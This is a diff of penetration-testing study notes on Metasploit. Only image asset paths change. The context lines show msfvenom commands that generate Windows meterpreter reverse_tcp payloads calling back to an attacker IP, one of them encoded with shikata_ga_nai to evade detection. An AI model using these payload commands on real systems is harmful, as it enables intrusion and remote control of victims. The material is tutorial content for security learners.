@@ -2,7 +2,7 @@
 
 ## What is Metasploit ?&#x20;
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>
 
 #### What is Metasploit?
 
@@ -25,7 +25,7 @@ ls /usr/share/metasploit-framework/tools/
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
 ## Modules&#x20;
 
@@ -37,7 +37,7 @@ search <module name>/<vulnerability name>
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1048).png" alt=""><figcaption></figcaption></figure>
 
 #### Search Filters&#x20;
 
@@ -51,7 +51,7 @@ search rank:excellent
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1050).png" alt=""><figcaption></figcaption></figure>
 
 ### Module Types&#x20;
 
@@ -70,15 +70,15 @@ use 0
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1052).png" alt=""><figcaption></figcaption></figure>
 
 #### taking module info&#x20;
 
-<figure><img src="../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1053).png" alt=""><figcaption></figcaption></figure>
 
 ### Setting Parameters&#x20;
 
-<figure><img src="../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1054).png" alt=""><figcaption></figcaption></figure>
 
 #### Temporary setting
 
@@ -112,7 +112,7 @@ exploit
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1055).png" alt=""><figcaption></figcaption></figure>
 
 ## Setting Target
 
@@ -126,7 +126,7 @@ Payload = What runs on the target
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1056).png" alt=""><figcaption></figcaption></figure>
 
 ### Automatic (Target 0)
 
@@ -259,7 +259,7 @@ Advantages:
 
 Victim connects back to attacker.
 
-<figure><img src="../../.gitbook/assets/image (598).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1078).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>
 
 ```
 Victim ─────► Attacker
@@ -277,7 +277,7 @@ Most commonly used because outbound traffic is usually allowed through firewalls
 
 Victim opens a port and waits.
 
-<figure><img src="../../.gitbook/assets/image (597).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1077).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>
 
 ```
 Attacker ─────► Victim
@@ -305,7 +305,7 @@ msfvenom -l payloads
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1079).png" alt=""><figcaption></figcaption></figure>
 
 #### Listing available encoders
 
@@ -315,7 +315,7 @@ msfvenom -l encoders
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1080).png" alt=""><figcaption></figcaption></figure>
 
 #### Listing available formats&#x20;
 
@@ -325,7 +325,7 @@ msfvenom -l formats
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (601).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1081).png" alt=""><figcaption></figcaption></figure>
 
 ### Creating payload
 
@@ -337,7 +337,7 @@ msfvenom -p <payload> --list-options
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1083).png" alt=""><figcaption></figcaption></figure>
 
 #### Creating payload with basic options&#x20;
 
@@ -347,7 +347,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.16.129 LPORT=3333 
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1084).png" alt=""><figcaption></figcaption></figure>
 
 #### Mandatory Things
 
@@ -357,7 +357,7 @@ msfvenom -p <payload> LHOST=<attacker ip> LPORT=<attacker port> -f <output forma
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1085).png" alt=""><figcaption></figcaption></figure>
 
 ## Spawning Interactive Shell
 
@@ -514,7 +514,7 @@ show encoders
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1057).png" alt=""><figcaption></figcaption></figure>
 
 ### Shikata Ga Nai (SGN)&#x20;
 
@@ -547,7 +547,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1058).png" alt=""><figcaption></figcaption></figure>
 
 ## Databases&#x20;
 
@@ -563,7 +563,7 @@ sudo systemctl start postgresql
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1059).png" alt=""><figcaption></figcaption></figure>
 
 #### Initialize MSF Database
 
@@ -580,7 +580,7 @@ sudo msfdb init
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1060).png" alt=""><figcaption></figcaption></figure>
 
 #### Check status&#x20;
 
@@ -594,11 +594,11 @@ db_status
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1061).png" alt=""><figcaption></figcaption></figure>
 
 _If database is already initialized and we want to run metasploit with database just use `sudo msfdb run` ._&#x20;
 
-<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1062).png" alt=""><figcaption></figcaption></figure>
 
 #### Delete the database and stop it&#x20;
 
@@ -608,7 +608,7 @@ sudo msfdb delete
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1063).png" alt=""><figcaption></figcaption></figure>
 
 ### Using the Database
 
@@ -616,7 +616,7 @@ sudo msfdb delete
 
 Think of workspaces as project folders.
 
-<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1064).png" alt=""><figcaption></figcaption></figure>
 
 **Create a workspace ⇒**&#x20;
 
@@ -626,7 +626,7 @@ workspace -a nexploit
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1065).png" alt=""><figcaption></figcaption></figure>
 
 #### Importing Scan Results&#x20;
 
@@ -643,9 +643,9 @@ services
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1066).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1067).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -653,17 +653,17 @@ services
 
 * hosts
 
-<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1068).png" alt=""><figcaption></figcaption></figure>
 
 * services
 
-<figure><img src="../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1069).png" alt=""><figcaption></figcaption></figure>
 
 </details>
 
 #### Finding hosts by protocol
 
-<figure><img src="../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1070).png" alt=""><figcaption></figcaption></figure>
 
 #### Credentials
 
@@ -691,7 +691,7 @@ db_nmap <scan config>
 _Scan results of `db_namp` will automatically be saved to the database. and no need to import._&#x20;
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1071).png" alt=""><figcaption></figcaption></figure>
 
 ### Export database
 
@@ -703,7 +703,7 @@ db_import backup.xml
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1072).png" alt=""><figcaption></figcaption></figure>
 
 ## Sessions&#x20;
 
@@ -715,7 +715,7 @@ sessions
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1073).png" alt=""><figcaption></figcaption></figure>
 
 ### Interacting with session&#x20;
 
@@ -725,7 +725,7 @@ sessions -i <id>
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1075).png" alt=""><figcaption></figcaption></figure>
 
 ### kill session
 
@@ -739,7 +739,7 @@ sessions -K
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1076).png" alt=""><figcaption></figcaption></figure>
 
 ## Post Exploitation and automating RDP&#x20;
 
